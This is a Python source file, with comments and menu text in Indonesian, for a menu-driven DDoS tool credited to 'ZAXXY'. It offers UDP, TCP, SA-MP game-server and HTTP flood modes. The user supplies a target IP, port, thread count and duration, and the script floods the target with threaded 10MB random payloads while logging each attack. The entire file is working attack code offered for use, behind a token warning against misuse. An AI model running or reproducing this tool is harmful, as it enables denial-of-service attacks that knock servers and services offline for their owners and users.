import socket
import threading
import time
import logging
import sys
import random
import os

# Set up logging
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Fungsi untuk mengatur warna hijau cerah
def print_green(text):
    print("\033[1;32m" + text + "\033[0m")

# Fungsi untuk menampilkan menu utama dengan teks hijau cerah
def display_menu():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear terminal screen
    print_green("\n" + "=" * 50)
    print_green(" " * 10 + "ZAXX × DDOS".center(30))  # Menampilkan ZAXX × DDOS di tengah
    print_green("=" * 50)
    print_green("\nDDOS TOOLS CODE BY ZAXXY")
    print_green("WARNING : JANGAN DI SALAH GUNAKAN")
    print_green("NOTE: GUNAKAN DENGAN BIJAK DAN BER AKAL\n")
    print_green("Pilih opsi:")
    print_green("1. UDP Flood")
    print_green("2. TCP Flood")
    print_green("3. SAMP DOS")
    print_green("4. Layer 7 (HTTP Flood)")
    print_green("5. Keluar")

# Fungsi untuk meminta input secara bertahap (IP, Port, Thread, Time)
def get_flood_input(menu_name):
    print(f"\n{menu_name} - Pengaturan Serangan")
    ip = input("Masukkan IP target: ")
    port = int(input("Masukkan Port target: "))
    threads = int(input("Masukkan jumlah thread (misalnya 125 untuk 1 Gbps): "))
    duration = int(input("Masukkan durasi serangan dalam detik: "))
    
    return ip, port, threads, duration

# Fungsi untuk mengirim UDP Flood
def udp_flood(ip, port, threads, duration, payload):
    log_attack_details(ip, port, threads, duration, "UDP Flood")
    print_green(f"Memulai serangan UDP Flood ke {ip}:{port} dengan {threads} thread selama {duration} detik...")
    
    def send_udp():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (ip, port))
        except Exception as e:
            print(f"Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(threads):
            threading.Thread(target=send_udp).start()

# Fungsi untuk mengirim TCP Flood
def tcp_flood(ip, port, threads, duration, payload):
    log_attack_details(ip, port, threads, duration, "TCP Flood")
    print_green(f"Memulai serangan TCP Flood ke {ip}:{port} dengan {threads} thread selama {duration} detik...")
    
    def send_tcp():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(payload)
        except Exception as e:
            print(f"Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(threads):
            threading.Thread(target=send_tcp).start()

# Fungsi untuk mengirim SAMP DOS (untuk server GTA SAMP)
def samp_dos(ip, port, threads, duration, payload):
    log_attack_details(ip, port, threads, duration, "SAMP DOS")
    print_green(f"Memulai serangan SAMP DOS ke {ip}:{port} dengan {threads} thread selama {duration} detik...")
    
    def send_samp():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(payload)
        except Exception as e:
            print(f"Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(threads):
            threading.Thread(target=send_samp).start()

# Fungsi untuk HTTP Flood (Layer 7)
def http_flood(ip, port, threads, duration, payload):
    log_attack_details(ip, port, threads, duration, "HTTP Flood")
    print_green(f"Memulai serangan HTTP Flood ke {ip}:{port} dengan {threads} thread selama {duration} detik...")

    def send_http():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(payload)
        except Exception as e:
            print(f"Error: {e}")

    end_time = time.time() + duration
    while time.time() < end_time:
        for _ in range(threads):
            threading.Thread(target=send_http).start()

# Fungsi untuk mencatat log serangan
def log_attack_details(ip, port, threads, duration, attack_type):
    log_message = f"Serangan dimulai: {attack_type} - IP={ip}, Port={port}, Threads={threads}, Durasi={duration}s"
    logging.info(log_message)

# Fungsi untuk menghasilkan payload besar (misalnya 10MB)
def generate_large_payload(size_mb):
    return random._urandom(size_mb * 1024 * 1024)  # Generate random payload of the specified size in MB

# Fungsi utama untuk memilih menu dan melakukan tindakan
def main():
    while True:
        display_menu()
        choice = input("Masukkan pilihan (1/2/3/4/5): ")
        
        if choice == '1':
            ip, port, threads, duration = get_flood_input("UDP Flood")
            payload = generate_large_payload(10)  # Generate 10MB payload
            udp_flood(ip, port, threads, duration, payload)
        elif choice == '2':
            ip, port, threads, duration = get_flood_input("TCP Flood")
            payload = generate_large_payload(10)  # Generate 10MB payload
            tcp_flood(ip, port, threads, duration, payload)
        elif choice == '3':
            ip, port, threads, duration = get_flood_input("SAMP DOS")
            payload = generate_large_payload(10)  # Generate 10MB payload
            samp_dos(ip, port, threads, duration, payload)
        elif choice == '4':
            ip, port, threads, duration = get_flood_input("HTTP Flood")
            payload = generate_large_payload(10)  # Generate 10MB payload
            http_flood(ip, port, threads, duration, payload)
        elif choice == '5':
            print_green("Keluar dari program.")
            sys.exit(0)
        else:
            print_green("Pilihan tidak valid. Silakan pilih 1, 2, 3, 4, atau 5.")

# Menjalankan program utama
if __name__ == "__main__":
    main()